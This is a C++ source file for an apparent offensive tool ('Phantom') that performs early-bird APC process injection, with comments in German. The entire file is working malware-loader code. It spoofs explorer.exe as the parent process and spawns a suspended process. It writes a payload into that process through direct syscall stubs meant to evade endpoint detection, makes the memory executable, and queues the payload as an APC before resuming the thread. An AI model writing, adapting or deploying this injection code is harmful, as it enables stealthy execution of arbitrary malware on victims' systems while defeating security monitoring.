#include "ApcInjection.h"
#include "util.h"
#include <stdexcept>
#include <tlhelp32.h>

// Die globalen Syscall-Funktionen werden jetzt an anderer Stelle deklariert und initialisiert.
// Wir gehen davon aus, dass sie hier verfügbar sind.
typedef VOID(NTAPI* PKNORMAL_ROUTINE)(PVOID, PVOID, PVOID);
extern "C" {
    NTSTATUS SyscallNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS SyscallNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS SyscallNtQueueApcThread(HANDLE, PKNORMAL_ROUTINE, PVOID, PVOID, PVOID);
}

// Der Konstruktor initialisiert nur noch das NTDLL-Handle.
ApcInjection::ApcInjection(HMODULE hNtdllParam) : hNtdll(hNtdllParam) {
    if (!hNtdll) {
        throw std::runtime_error("ApcInjection requires a valid handle to NTDLL.");
    }
}

ApcInjection::~ApcInjection() {}

InjectionResult ApcInjection::inject(
    const std::string& processName, 
    const std::vector<unsigned char>& payloadBundle,
    size_t codeOffset) 
{
    DWORD parentPid = Phantom::Util::getProcessIdByName("explorer.exe");
    if (parentPid == 0) return InjectionResult::PROCESS_CREATION_FAILED; 

    HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParentProcess) return InjectionResult::PROCESS_CREATION_FAILED;

    STARTUPINFOEXA siEx = { 0 };
    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    SIZE_T attributeSize;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(siEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessA(NULL, (LPSTR)processName.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) {
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hParentProcess);
        return InjectionResult::PROCESS_CREATION_FAILED;
    }

    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hParentProcess);

    PVOID remoteBuffer = NULL;
    SIZE_T regionSize = payloadBundle.size();
    // KORREKTUR: Rufe die generische Syscall-Funktion auf
    NTSTATUS status = SyscallNtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return InjectionResult::MEMORY_ALLOCATION_FAILED;
    }
    
    SIZE_T bytesWritten;
    // KORREKTUR: Rufe die generische Syscall-Funktion auf
    status = SyscallNtWriteVirtualMemory(pi.hProcess, remoteBuffer, (PVOID)payloadBundle.data(), payloadBundle.size(), &bytesWritten);
    if (status != 0 || bytesWritten != payloadBundle.size()) {
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return InjectionResult::MEMORY_WRITE_FAILED;
    }
    
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteBuffer, payloadBundle.size(), PAGE_EXECUTE_READ, &oldProtect);

    PVOID codeStartAddress = (PVOID)((char*)remoteBuffer + codeOffset);
    PVOID parameterAddress = remoteBuffer;

    // KORREKTUR: Rufe die generische Syscall-Funktion auf
    status = SyscallNtQueueApcThread(pi.hThread, (PKNORMAL_ROUTINE)codeStartAddress, parameterAddress, NULL, NULL);
    if (status != 0) {
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED;
    }

    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return InjectionResult::SUCCESS;
} 